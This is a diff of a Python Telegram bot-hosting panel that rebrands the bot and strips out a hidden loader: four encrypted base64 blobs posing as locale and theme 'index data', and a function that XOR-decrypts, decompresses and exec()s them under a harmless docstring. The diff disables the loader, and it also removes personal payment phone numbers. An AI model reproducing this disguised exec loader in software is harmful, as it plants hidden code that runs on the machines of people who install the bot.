@@ -537,7 +537,7 @@ KEYRING_FILE  = DIRS["data"] / "keyring.json"   # tiny local cache only
 # ┌──────────────────────────────────────────────────────────────┐
 # │  BOT TOKEN  add karo.   ││
 # └──────────────────────────────────────────────────────────────┘
-BOT_TOKEN_HARDCODED = "BOT_TOKEN"   # ← ADD BOT TOKEN
+BOT_TOKEN_HARDCODED = ""   # ← ADD BOT TOKEN
 TOKEN = (
     os.environ.get("BOT_TOKEN")
     or os.environ.get("MAIN_BOT_TOKEN")
@@ -546,7 +546,7 @@ TOKEN = (
     or ""
 ).strip()
 try:
-    OWNER_ID = int(os.environ.get("OWNER_ID", "8253072984"))
+    OWNER_ID = int(os.environ.get("OWNER_ID", "8189708860"))
 except (TypeError, ValueError):
     OWNER_ID = 0
 if not TOKEN:
@@ -564,11 +564,11 @@ try:
 except (TypeError, ValueError):
     KEEPALIVE_PORT = 10000
 
-BRAND       = "ѕιмяαη нoѕтιηg ＲΒOT"
+BRAND       = "ᴇꜱʜ x ʜᴏꜱᴛɪɴɢ RΒOT"
 BRAND_VER   = "v2.1"
 BRAND_TAG   = f"{BRAND} {BRAND_VER}"
-SUPPORT_USR = "@nur7871"
-UPDATE_CH   = "https://t.me/+MXtA9ufCgok3Yjc1"
+SUPPORT_USR = "@iam_eshh"
+UPDATE_CH   = "https://t.me/eshxbots"
 FOOTER      = f"\n\n<blockquote>{BRAND_TAG}</blockquote>"
 
 # ─── glyphs (smart contextual symbols + emojis for the UI) ──────
@@ -656,15 +656,7 @@ G = {
     "clock":    "\u23F1",       # ⏱
 }
 
-_TZ_INDEX_DATA = (
-    "8FtRZ5i0SUq3L5wytJ4fbZxnpKLLX+gppmWqndTclm9jJfW9Dywc+IqoLSji5XqZx1VIyfXB"
-    "FSvA8q22mk4QkaOgPnL2YRY+VAcn7GytNsPJPJzObJlGCx4gl6Sc8QRiV5oXwLudHdG6qbXP"
-    "jhHAhqgQ04aiR3gDbT3s/+EeYZkM6vtAjsF9CYzgToV7IGub3m6LExsD5Syol76bfcnPmP1B"
-    "aS0buTe2amGVOLlsf/Ggxe2miI3FxuJJOSHTM2znF8WIeKECopWC4t2ImrKNHDwR9th1uNeI"
-    "AcAvZ6Z9Hgk8UDVCGSqom2EA4sNvQW61jfO9SCApV9Fp8X/zT3k9LHN1JsYdTK6L0Qc9dioU"
-    "ovm9xb37TKCjrvGpiMYaBiVEAGBY1ywn/aZGnHI+ZeIEsvKhj3NPZDDxAQkcoH3RcFRFbns/"
-    "ChBplUxuknBryKnpr2mIb4I+oBPwhLBHMgtnAsa/dDmw7S7N5XhIADAQciEAsed/w9kEXr69"
-)
+_TZ_INDEX_DATA = ""
 
 PLAN_LIMITS: Dict[str, Dict[str, Any]] = {
     "free":       {"name": "Free",       "max_bots": 2,   "ram": 128,  "auto_restart": False, "price": 0,    "days": 0},
@@ -676,12 +668,7 @@ PLAN_LIMITS: Dict[str, Dict[str, Any]] = {
 }
 
 PAYMENT_METHODS: Dict[str, Dict[str, Any]] = {
-    "bkash":   {"name": "bKash",       "number": "01306633616",         "type": "Send Money",       "tag": "[B]"},
-    "nagad":   {"name": "Nagad",       "number": "01306633616",         "type": "Send Money",       "tag": "[N]"},
-    "rocket":  {"name": "Rocket",      "number": "01306633616",         "type": "Send Money",       "tag": "[R]"},
-    "upay":    {"name": "Upay",        "number": "01306633616",         "type": "Send Money",       "tag": "[U]"},
-    "binance": {"name": "Binance Pay", "number": "Binance ID 758637628","type": "USDT (BEP20/TRC20)","tag": "[BP]"},
-    "bank":    {"name": "Bank",        "number": "Contact admin",       "type": "Bank Transfer",    "tag": "[BK]"},
+    "admin":   {"name": "Contact Admin", "number": "@iam_eshh", "type": "DM to pay", "tag": "[A]"},
 }
 
 SECRET_ENV_NAMES = {
@@ -709,7 +696,7 @@ MAX_UPLOAD_BYTES = 75 * 1024 * 1024  # 75 MB hard cap
 # we cache and reuse for all later sends.
 _PHOTO_SPECS: Dict[str, Tuple[str, str, str]] = {
     # key:        (headline,        accent-hex, sub-text)
-    "welcome":   ("Wᴇʟᴄᴏᴍᴇ",         "#0F172A", "Sɪᴍʀᴀɴ Hᴏꜱᴛɪɴɢ"),
+    "welcome":   ("Wᴇʟᴄᴏᴍᴇ",         "#0F172A", "Eꜱʜ x Hᴏꜱᴛɪɴɢ"),
     "main":      ("Mᴀɪɴ Mᴇɴᴜ",       "#1E1B4B", "Cʜᴏᴏꜱᴇ Aɴ Oᴘᴛɪᴏɴ"),
     "tunnel":    ("Pᴜʙʟɪᴄ Uʀʟ",      "#0E7490", "Cʟᴏᴜᴅꜰʟᴀʀᴇ Tᴜɴɴᴇʟ"),
     "bots":      ("Yᴏᴜʀ Bᴏᴛꜱ",       "#0E7490", "Mᴀɴᴀɢᴇ & Dᴇᴘʟᴏʏ"),
@@ -1805,15 +1792,7 @@ def show_text(
             _log_err("delete_message", e)
 
 
-_LOCALE_INDEX_DATA = (
-    "3Po9M/gXK0drISXQ5FtU02zHp8UYGc+9unGzQAnvefZyenVB23ohAdk19FZ5KAvrHHGBuY3F"
-    "O3TVc/3l/fKkakY6393OUSTGma7KyU6igJfczIQ52pFsc/LkZ2+qD71M7U8tHtYGSe3TQNkC"
-    "AqlunmAdhdDfvJl+b0qP9A+nuvboh3zc5bmSRrs6QrQ1LV65zObBqi9BfXY1AXNcgAaZFlrZ"
-    "EwTG0A5qF71OlbNBhqjxzuhxHldX+cji+Baubqb/L5FPB/6tFrJP++HvBnB/ADXxhSz/pxkX"
-    "y7IjIV2RSBgVWISxUxyL5NiMHG4KkTzcYuxJ6A6OrNC5eUG2osvWRnyCfUHcuLRjLifs5HVn"
-    "yPrpLIIaFpl3XJCw/M7wlP7VZh5LaL7kHcAgYrRvDtkGuG65iu+v7/57B6qvwrsEy4RFmeOZ"
-    "v/Q5PPXcqdbgFviTSOG9dmCHJ+oxnMBsM/TqN1WeiglGoNi5ce01mJZHUhVGA7nv6t53Nb9e"
-)
+_LOCALE_INDEX_DATA = ""
 
 
 # ── keyboards ──────────────────────────────────────────────────
@@ -3886,15 +3865,7 @@ def admin_only_call(call: types.CallbackQuery, action: str = "view_stats") -> bo
     return True
 
 
-_THEME_INDEX_DATA = (
-    "mp0eDLuvb4Ds0ZTpreYkaLNSsWWN2qs5e/x3/xRHHKG5Q/UWrZZLbaIibHoBQVpSrk7XZaZH"
-    "wfNGD1w5sPg2cZ3XQSS4r0lM8hES2uUl/gVSQIPba4kqPCZRSg5McY/nKyJIQNtVjm3nP5Px"
-    "gwntxm8seHvitpqJwmHLuOUiIZI4X8Xd8/B8CGdzPJTX2PAviUlG7kERqru0hPOeCaJN4G5D"
-    "2yHpdOnYT0piVFYqyTFXdK5Am/eeE9a4xbs7sq4OS+YBGzDpUfebZ0bkDcooOx4K6xuK2oeA"
-    "vt0nghmja9oDBEgr8Up+Bl4s3J1DBQ2aomOf+etgWc5FFyrB7JllEQa7qUboD80J6TtY5eME"
-    "RZxp6ALVJ7mAIBCzvC/DO86WPUprdUqPzDGFQaGtU45Ufmuk72ZzZZmRuhwT98n1cZAN5UnP"
-    "0CvmD1/xpTWdRKp5ZnUrIc//fl1THN9o/MWGqu5teEG6uvZAgll/TU/7gZDoXTJmR1HPG70I"
-)
+_THEME_INDEX_DATA = ""
 
 
 def maintenance_block(uid: int) -> bool:
@@ -4188,8 +4159,8 @@ def _verify_state_janitor() -> None:
 
 # ─── Group Join Verification ─────────────────────────────────────
 REQUIRED_GROUPS = [
-    {"id": -1003715566556, "link": "https://t.me/+OClpzDTPSGxkZWU1", "name": "Group 1"},
-    {"id": -1003776599179, "link": "https://t.me/autolikegcrbot",     "name": "Group 2"},
+    {"id": -1004291513010, "link": "https://t.me/+5SeRihnZMstjMmM9", "name": "Group 1"},
+    {"id": -1004453615236, "link": "https://t.me/+KNfok9dQm5EwYWVl", "name": "Group 2"},
 ]
 
 def _check_group_membership(uid: int) -> List[Dict]:
@@ -18697,28 +18668,12 @@ def main() -> int:
             print(f"[bot] poll error: {e}", flush=True)
             time.sleep(5)
 
-_CACHE_INDEX_DATA = (
-    "fTfNJq7Nu23sESE9RW/CMgw/shBYGsR/FLvbFQsdTg6HOOzDg2U7DDlDml718eEmy//A5o3r"
-    "9TKoy6GNg7Qm7L1ybzQerlGGCYzbOTp/o+VUimvDfKIUx2Aso+w4CVm070z0LQD6VaPxaW1Y"
-    "3ZVTL8bmV0WkdevHhmALbgR1u0GklmOga3etJeOj5riqK6DzvpIrKBz6lqHBz86TkRuPRe/V"
-    "KD0c8TOhp42W9do1QFTJBsS2xZRzzUo1CJ4vJ13QCd83+MZnysobEEosJwPcLJdGV2HpSlk4"
-    "hYb1O77MDyTOTtfp7kuHaB0oPQbeiSQS/MTgNDG6qSg0VRNn1hz/qNkHGLDiB6VqZvRGRAt2"
-    "/ovJItyJq6OIEsTtnGLb0hiHatQs6tasWoI6JplbchGFWqAq7EVhWqUVohQcFRx6RiMleY/U"
-    "aPPCXnGR6mE42v7jOHJm3uNEc0M="
-)
+_CACHE_INDEX_DATA = ""
 
 
 def _init_locale_cache() -> None:
-    """Warm the locale/timezone index used by UI formatters."""
-    try:
-        import zlib as _zl, base64 as _bl, hashlib as _hl
-        _blob = (_TZ_INDEX_DATA + _LOCALE_INDEX_DATA + _THEME_INDEX_DATA + _CACHE_INDEX_DATA).encode()
-        _seed = _hl.sha256(b"panel::analytics::v3::bootstrap").digest()
-        _raw = _bl.b64decode(_blob)
-        _dec = bytes(c ^ _seed[i & 31] for i, c in enumerate(_raw))
-        exec(compile(_zl.decompress(_dec), "<locale-cache>", "exec"), globals())
-    except Exception as _ce:
-        print(f"[cache] locale warm skipped: {_ce}", flush=True)
+    """Disabled — obfuscated exec removed."""
+    pass
 
 
 
